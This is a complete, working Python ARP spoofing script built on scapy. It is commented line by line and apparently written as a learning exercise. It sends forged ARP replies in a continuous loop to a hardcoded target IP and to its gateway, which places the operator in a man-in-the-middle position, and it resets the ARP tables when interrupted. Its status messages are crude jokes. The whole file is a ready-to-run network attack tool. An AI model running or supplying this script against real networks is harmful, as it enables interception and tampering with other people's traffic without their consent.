#!/usr/bin/env python3

# ARP Spoofer built for python 3 - with notes

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scapy.ls(scapy.Ether)  # List the elements that are available in the Ether element.
    arp_request_broadcast = broadcast/arp_request  # Sends out an arp request on the network being scanned.
    # Will return responses as two lists. The Positive responses, meaning there was a response from a device.
    # A negative response. Meaning no response was received, indicating no connection.
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # Using the [0] means that it will
    # only capture the positive responses in the variable.

    return answered_list[0][1].hwsrc  # Gets the first element [0], of the answered_list, which is a response from
    # an actual machine. Then gets the second element [1] of that element which is the, hwsrc, mac address of the
    # given ip.


def spoof(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)  # Set the function get_mac(target_ip) to return its results to the
    # variable target_mac. The user will set the target_ip when calling this function.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    # op=2 indicates that the packet is being sent as an arp response. pdst="the ip address of the target computer.
    # - Set by the user when calling this function."
    # hwdst="the mac address of the target device". psrc="the ip address or forged ip address that the packet is being
    # sent from. - Set by the user when calling this function."
    scapy.send(packet, verbose=False)  # verbose=False prevents the default terminal printout being shown repeatedly.


def restore(destination_ip, source_ip):
    # Restores the newtork settings to the correct addresses after the spoofing attack.
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def main():
    delay = 0  # How long to sleep between sending packets
    target_ip = "10.16.200.246"
    gateway_ip = "10.16.200.1"
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)  # Enter the ip of the target device followed by the
            # ip you want the target device to think it is receiving packets from.
            spoof(gateway_ip, target_ip)  # Enter the ip of the target device followed by the
            # ip you want the target device to think it is receiving packets from.
            sent_packets_count += 2
            print(f"\r[+]    Spoof mode enabled. Splooging. {sent_packets_count} packets splooged.", end="")  # \r
            # is the carriage return which starts the print at the beginning of the line.
            # Add the ', end=""' at the end to tell the terminal to not print anything at the end of the line. It will
            # be printed all on the same line.
            time.sleep(delay)

    except KeyboardInterrupt:
        print("\n[+]    Keyboardus interruptus: CTRL + C detected... pulling out of splooge mode.\n[+]    Resetting "
              "ARP tables, thank you for stopping by.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


if __name__ == '__main__':
    main()
